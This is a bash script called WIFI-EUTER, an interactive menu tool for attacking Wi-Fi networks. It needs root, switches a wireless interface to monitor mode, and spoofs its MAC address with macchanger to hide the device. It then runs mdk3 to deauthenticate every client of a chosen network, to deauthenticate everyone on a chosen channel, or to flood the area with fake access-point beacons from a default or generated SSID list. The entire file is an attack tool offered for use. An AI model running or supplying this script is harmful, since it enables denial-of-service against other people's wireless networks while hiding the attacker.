#!/bin/bash

# Check if running as root.
super_user() {
  if [[ "$EUID" -ne 0 ]]; then
    clear
    logo1
    echo " ERROR!!! This script must be run as root." 
    exit 
  fi
}

# Logo or banner here
logo1() {
clear
echo ""
echo -e "                       ██╗    ██╗██╗███████╗██╗                 "    
echo -e "                       ██║    ██║██║██╔════╝██║                 " 
echo -e "                       ██║ █╗ ██║██║█████╗  ██║                 "
echo -e "                       ██║███╗██║██║██╔══╝  ██║                 "
echo -e "                       ╚███╔███╔╝██║██║     ██║                 "
echo -e "                        ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝                 "                          
echo -e "               ███████╗██╗   ██╗████████╗███████╗██████╗        "
echo -e "               ██╔════╝██║   ██║╚══██╔══╝██╔════╝██╔══██╗       "
echo -e "               █████╗  ██║   ██║   ██║   █████╗  ██████╔╝       "
echo -e "               ██╔══╝  ██║   ██║   ██║   ██╔══╝  ██╔══██╗       "
echo -e "               ███████╗╚██████╔╝   ██║   ███████╗██║  ██║       "
echo -e "               ╚══════╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝       "
echo ""
echo "              CODED BY: JAYSON CABRILLAS SAN BUENAVENTURA"
echo ""
echo ""
}

# Function to get the interface
get_iface () {
	echo " Interface List "
	echo " =============="
	interface=$(ifconfig -a | sed 's/[ \t].*//;/^$/d' | tr -d ':' > .iface.tmp)
	con=1
	for x in $(cat .iface.tmp); do
		echo "%s) %s" $con $x
		let con++
	done
	echo  " ┌─[wifi@euter]─[~]" 
	read -p " └──╼ # " iface
	iface=$(sed ''$iface'q;d' .iface.tmp)
	IFS=$''
}

# Function to enable changing to monitor mode
iface_mon () {
	ifconfig $iface down
	iwconfig $iface mode monitor
	# Change MAC Address
	macchanger -r $iface
	ifconfig $iface up
}

# Function to deactivate monitor mode
iface_man () {
	clear
	sleep 3
	ifconfig $iface down >> /dev/null 2>&1
	macchanger -p $iface >> /dev/null 2>&1
	iwconfig $iface mode managed >> /dev/null 2>&1
	ifconfig $iface up >> /dev/null 2>&1
	clear
	logo1
	echo " [*] Putting interface in managed mode..."
	rm -f .iface.tmp
	exit
}

iface_man2 () {
	clear
	sleep 3
	ifconfig $iface down >> /dev/null 2>&1
	macchanger -p $iface >> /dev/null 2>&1
	iwconfig $iface mode managed >> /dev/null 2>&1
	ifconfig $iface up >> /dev/null 2>&1
	nmcli device connect $iface >> /dev/null 2>&1
	clear
	logo1
	echo " [*] Putting interface in managed mode..."
	rm -f .iface.tmp
	rm -f $rand_ssid"_list.txt"
	exit
}

### Menu ###
clear
super_user
logo1
echo " [01] Deauth all clients"
echo " [02] Deauth all channels"
echo " [03] Spam fake AP"
echo " [00] Exit"
echo ""
echo  " ┌─[wifi@euter]─[~]" 
read -p " └──╼ # " attack
clear

if [[ $attack == "01" || $attack == "1" ]]; then
	logo1
	echo "$"
	nmcli dev wifi
	echo  " ┌─[wifi@euter]─[~]" 
	read -p " └──╼ # " attck_ssid
	clear
	logo1
	get_iface
	clear
	logo1
	echo "                         [ WIFI-EUTER ]"
	
	iface_mon >> /dev/null 2>&1
	trap iface_man EXIT ### CTRL+C to exit
	mdk3 $iface d -n $attck_ssid

elif [[ $attack == "02" || $attack == "2" ]]; then
	logo1
	nmcli dev wifi
	echo ""
	echo  " ┌─[wifi@euter]─[~]"
    read -p " └──╼ # " attck_chnl
	clear
	logo1
	get_iface
	clear
	logo1
	echo "                         [ WIFI-EUTER ]"
	
	iface_mon >> /dev/null 2>&1
	trap iface_man EXIT ### CTRL+C to exit
	mdk3 $iface d -c $attck_chnl

elif [[ $attack == "03" || $attack == "3" ]]; then
	logo1
	get_iface
	clear
	logo1
	echo " [01] Use default ssid_list"
	echo " [02] Use custom ssid_list"
	echo ""
	echo  " ┌─[wifi@euter]─[~]" 
	read -p " └──╼ # " spm
	
	if [[ $spm == "01" || $spm == "1" ]]; then
		nmcli device disconnect $iface >> /dev/null 2>&1
		clear
		logo1
		trap iface_man2 EXIT ### CTRL+C to exit
		sleep 2
		echo "                         [ WIFI-EUTER ]"
		
		ifconfig $iface down
		macchanger -r $iface >> /dev/null 2>&1
		iwconfig $iface mode monitor
		ifconfig $iface up
		trap iface_man2 EXIT ### CTRL+C to exit
		mdk3 $iface b -f ssid_list.txt -a -s 1000
	
	elif [[ $spm == "02" || $spm == "2" ]]; then
		con=1
		nmcli device disconnect $AD > /dev/null 2>&1
		clear
		logo1
		read -p " Enter SSID: " rand_ssid
		read -P " SSID count: " con_ssid
		for x in $(seq 1 $con_ssid); do
			echo "$rand_ssid $x" >> $rand_ssid"_list.txt"
		done
		wait
		clear
		logo1
		trap iface_man2 EXIT ### CTRL+C to exit
		sleep 2
		echo "                         [ WIFI-EUTER ]"
		
		ifconfig $iface down
		macchanger -r $iface >> /dev/null 2>&1
		iwconfig $iface mode monitor
		ifconfig $iface up
		trap iface_man2 EXIT
		mdk3 $iface b -f $rand_ssid"_list.txt" -a -s 1000
	else
		echo " [!] Invalid Input ..."
		sleep 4
		trap iface_man2 EXIT ### CTRL+C to exit
	fi
else
	echo " [!] Invalid Input ..."
	sleep 4
	trap iface_man EXIT ### CTRL+C to exit
fi
